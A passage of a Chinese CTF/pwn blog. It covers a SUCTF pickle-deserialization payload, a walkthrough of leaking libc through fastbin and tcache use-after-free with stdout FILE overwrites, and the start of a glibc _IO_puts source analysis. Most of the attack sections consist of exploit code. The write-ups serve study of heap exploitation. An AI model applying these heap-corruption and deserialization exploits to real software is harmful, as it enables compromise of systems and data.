<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">exp = <span class="string">b'''cguess_game</span></span><br><span class="line"><span class="string">game</span></span><br><span class="line"><span class="string">&#125;S"win_count"</span></span><br><span class="line"><span class="string">I10</span></span><br><span class="line"><span class="string">sS"round_count"</span></span><br><span class="line"><span class="string">I9   #重新构造round_count与win_count中的数据</span></span><br><span class="line"><span class="string">sb'''</span><span class="comment">#更新game中的dict数据</span></span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/rmb122/suctf2019_guess_game/tree/master/writeup" target="_blank" rel="noopener">https://github.com/ppcrab/suctf2019_guess_game</a></p>
<p>越到后面越觉得和shellcode 相像，只不过是另外的一个架构罢了。或许，底层的东西都很相似。</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://juejin.im/post/5be4e7b5e51d4535b07d1590" target="_blank" rel="noopener">https://juejin.im/post/5be4e7b5e51d4535b07d1590</a></p>
<p><a href="https://blog.csdn.net/shixiaoguo90/article/details/22433245" target="_blank" rel="noopener">https://blog.csdn.net/shixiaoguo90/article/details/22433245</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a></p>
<p><a href="https://github.com/rmb122/suctf2019_guess_game/tree/master/writeup" target="_blank" rel="noopener">https://github.com/rmb122/suctf2019_guess_game/tree/master/writeup</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/08/09/以fastbin为基础的leak/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/photo/hello.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/08/09/以fastbin为基础的leak/" itemprop="url">以fastbin为基础的leak</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-09T07:55:17+08:00">
                2019-08-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  809
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  3
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>fastbin作为单链表的存在，无法直接泄露libc地址，但是我们也是有方法进行伪造、转换，进行libc地址的泄露的。</p>
<p>以下情况方法的讨论的前提时可以进行uaf利用</p>
<h4 id="无tcache保护"><a href="#无tcache保护" class="headerlink" title="无tcache保护"></a>无tcache保护</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x60</span>, <span class="number">0</span>, <span class="string">'a'</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">create(<span class="number">0x60</span>, <span class="number">1</span>, <span class="string">'b'</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">create(<span class="number">0x60</span>, <span class="number">2</span>, <span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x60</span>, <span class="number">3</span>, <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/2019/08/09/以fastbin为基础的leak/1.PNG" alt="1"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p> <img src="/2019/08/09/以fastbin为基础的leak/2.PNG" alt="2"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create(0x60, 4, &apos;\x60&apos;)#更改链表，指向我们伪造的地址</span><br><span class="line">create(0x60, 5, &apos;\n&apos;)</span><br><span class="line">create(0x60, 6, &apos;\n&apos;)</span><br><span class="line">create(0x60, 7, p64(0) + p64(0xe1))</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</span><br><span class="line">errout:</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为我们伪造的数据0x71，所以这里我们可以绕过这个malloc的检查</p>
<p> <img src="/2019/08/09/以fastbin为基础的leak/3.PNG" alt="3"></p>
<p>成功申请伪造的chunk地址，并且更改了0x005…080的数据，成功的伪造了第二个chunk即大小0xe1,不再进入fastbin链中。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p> <img src="/2019/08/09/以fastbin为基础的leak/4.PNG" alt="4"></p>
<p>可以看到unsortbin链中已经有了chunk块</p>
<p>此时堆中即有了libc地址，或使用程序提供的show函数，或者爆破改写libc地址使之控制stdout或stderr，即可进行libc泄露</p>
<h5 id="无tcache下的任意地址写"><a href="#无tcache下的任意地址写" class="headerlink" title="无tcache下的任意地址写"></a>无tcache下的任意地址写</h5><p>还是上面那个程序，继续进行利用，使用改写stdout的方式进行libc泄露用以展示任意地址写</p>
<p>这时候我们已经得到了一个unsortbin块，一方面，再次构造一个unsortbin可以吗？不太好弄，因为这个伪造的chunk块其实也是爆破了2字节出来的，只不过我这里虚拟机的pie关了，所以没有爆破</p>
<p>直接释放，然后改写地址，再次申请呢？也不行，因为只申请0x60大小的chunk块，只能分割这个unsortbin，没办法申请到任意地址</p>
<p>还得是伪造chunk块，先分割</p>
<p>先看一下直接分割伪造的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">create(0x28, 8, &apos;\n&apos;)</span><br><span class="line">create(0x38, 8, &apos;\n&apos;)</span><br></pre></td></tr></table></figure>
<p> <img src="/2019/08/09/以fastbin为基础的leak/7.PNG" alt="7"></p>
<p> <img src="/2019/08/09/以fastbin为基础的leak/8.PNG" alt="8"></p>
<p>这时候就可以进行改写libc地址为stdout或stderr</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename(<span class="number">2</span>,p16(<span class="number">0x25dd</span>))<span class="comment">#stderr</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="number">6</span>, p16(<span class="number">0x25dd</span>))</span><br><span class="line">create(<span class="number">0x60</span>, <span class="number">8</span>, <span class="string">'\0'</span> * <span class="number">0x33</span> + p64(<span class="number">0x00000000fbad2887</span> + <span class="number">0x1000</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">'\x88'</span>)</span><br></pre></td></tr></table></figure>
<p>剩下的步骤就是改写利用free_hook或者malloc_hook了，不再提及</p>
<h4 id="有tcache保护"><a href="#有tcache保护" class="headerlink" title="有tcache保护"></a>有tcache保护</h4><p>看一下tcache_get的源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>并没有fastbin那么复杂，甚至没有size检查，so，伪造起来很容易</p>
<p>初期的时候差不多，但是更简单</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x40</span>,<span class="number">0</span>,p64(<span class="number">0x21</span>)*<span class="number">8</span>)</span><br><span class="line">create(<span class="number">0x40</span>,<span class="number">1</span>,p64(<span class="number">0x21</span>)*<span class="number">8</span>)</span><br><span class="line">create(<span class="number">0x40</span>,<span class="number">2</span>,p64(<span class="number">0x21</span>)*<span class="number">8</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p> <img src="/2019/08/09/以fastbin为基础的leak/21.PNG" alt="21"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename(<span class="number">0</span>,<span class="string">"\x50"</span>)</span><br><span class="line">create(<span class="number">0x40</span>,<span class="number">1</span>,<span class="string">"\n"</span>)</span><br><span class="line">create(<span class="number">0x40</span>,<span class="number">2</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>))</span><br></pre></td></tr></table></figure>
<p> <img src="/2019/08/09/以fastbin为基础的leak/22.PNG" alt="22"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x555555757250:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x555555757260:	0x000055555575720a	0x0000000000000021</span><br></pre></td></tr></table></figure>
<p>满tcache</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for x in range(7):</span><br><span class="line">	free(0)</span><br></pre></td></tr></table></figure>
<p>最关键的一步，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rename(2,p64(0)+p64(0x51))</span><br><span class="line">free(0)</span><br><span class="line">rename(2,p64(0)+p64(0x91))</span><br><span class="line">free(0)</span><br></pre></td></tr></table></figure>
<p> <img src="/2019/08/09/以fastbin为基础的leak/23.PNG" alt="23"></p>
<p>关键的原因在于，通过这一步，不仅得到了unsortbin(如果仅仅为了得到unsortbin，可以更简单，先改，然后free八次就够了)</p>
<p>但是这里多free了一次，因为还要用tcache进行fd的修改</p>
<h5 id="有tchche的情况下的任意地址写"><a href="#有tchche的情况下的任意地址写" class="headerlink" title="有tchche的情况下的任意地址写"></a>有tchche的情况下的任意地址写</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)+<span class="string">"\x60\x07\xdd"</span>)</span><br><span class="line">create(<span class="number">0x40</span>,<span class="number">0</span>,<span class="string">"\n"</span>)</span><br><span class="line">create(<span class="number">0x40</span>,<span class="number">1</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>)</span><br></pre></td></tr></table></figure>
<p> <img src="/2019/08/09/以fastbin为基础的leak/24.PNG" alt="24"></p>
<p>至此，完成初步利用</p>
<p> <img src="/2019/08/09/以fastbin为基础的leak/25.PNG" alt="25"></p>
<p>成功泄露出libc的地址</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/08/05/从stdout入手解决leak泄露/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/photo/hello.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/08/05/从stdout入手解决leak泄露/" itemprop="url">从stdout入手解决leak泄露</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-05T15:18:32+08:00">
                2019-08-05
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  1.4k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  7
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>leak地址的泄露是大部分pwn程序进行权限获取的一个必经的步骤。</p>
<p>我准备记录一波利用stdout进行leak的操作</p>
<h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p>file结构体的结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">_IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>分析一波puts函数的调用过程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_puts (<span class="keyword">const</span> <span class="keyword">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = EOF;</span><br><span class="line">  <span class="keyword">size_t</span> len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">'\n'</span>, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span></span><br></pre></td></tr></table></figure>
<p>其是由<code>_IO_puts</code>函数实现，其内部调用<code>_IO_sputn</code>,实际上和输出直接相关的只有这个函数，<a href="https://baijiahao.baidu.com/s?id=1606846314561521273&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">而<code>_IO_sputn</code>会被化简为虚函数表里的__xsputn指针</a></p>
<p><img src="/2019/08/05/从stdout入手解决leak泄露/u=4050324728,2035627572&amp;fm=173&amp;app=25&amp;f=JPEG.jpg" alt="u=4050324728,2035627572&amp;fm=173&amp;app=25&amp;f=JPEG"></p>
<p>也就是接着执行<code>_IO_new_file_xsputn</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span></span><br><span class="line">_IO_new_file_xsputn (FILE *f, <span class="keyword">const</span> <span class="keyword">void</span> *data, <span class="keyword">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *s = (<span class="keyword">const</span> <span class="keyword">char</span> *) data;</span><br><span class="line">  <span class="keyword">size_t</span> to_do = n;</span><br><span class="line">  <span class="keyword">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;<span class="comment">//初始缓冲区空间</span></span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">const</span> <span class="keyword">char</span> *p;</span><br><span class="line">          <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> (*--p == <span class="string">'\n'</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                  count = p - s + <span class="number">1</span>;<span class="comment">//看情况缩小</span></span><br><span class="line">                  must_flush = <span class="number">1</span>;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">        count = to_do;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">size_t</span> block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line">        <span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">           caller that everything has been written.  */</span></span><br><span class="line">        <span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">        &#123;</span><br><span class="line">          count = new_do_write (f, s, do_write);</span><br><span class="line">          to_do -= count;</span><br><span class="line">          <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">            <span class="keyword">return</span> n - to_do;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment">         buffer, but it's somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment">         so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">        to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)</span><br></pre></td></tr></table></figure>
<p>主要的作用就是判断了缓冲区还够不够用，然后进行文件指针的写入操作，还有输出操作，但是很可惜并没有我们可以随意控制的地址的输出。但是在输出操作之前，正常情况下会进行一个判断 <code>if (_IO_OVERFLOW (f, EOF) == EOF)</code></p>
<p>也就是调用了_IO_OVERFLOW 函数</p>
